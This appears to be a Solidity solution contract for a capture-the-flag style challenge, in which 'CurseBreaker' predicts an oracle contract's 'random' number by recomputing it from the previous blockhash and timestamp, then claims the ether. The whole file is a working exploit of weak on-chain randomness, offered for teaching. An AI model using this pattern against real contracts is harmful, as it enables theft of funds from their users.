// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title CurseBreaker
 * @dev A contract devised by a cunning adventurer, designed to break the Oracle's curse
 * and claim the treasure that many have sought but none have seized.
 * 
 * By studying the ancient texts and understanding the flaws in the Oracle's method,
 * the CurseBreaker knows the secret to predicting the "unpredictable" number.
 * 
 * Author: Lucas Martin Calderon
 * Challenge: Use this contract to unveil the Oracle's secret and lift the curse.
 */
contract CurseBreaker {
    function breakCurse(OracleOfFates oracle) public {
        uint secret = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        oracle.divineSecret(secret);
    }

    // Function to accept treasure from the Oracle
    receive() external payable {}

    // Check the spoils of victory
    function spoilsOfVictory() public view returns (uint) {
        return address(this).balance;
    }
}
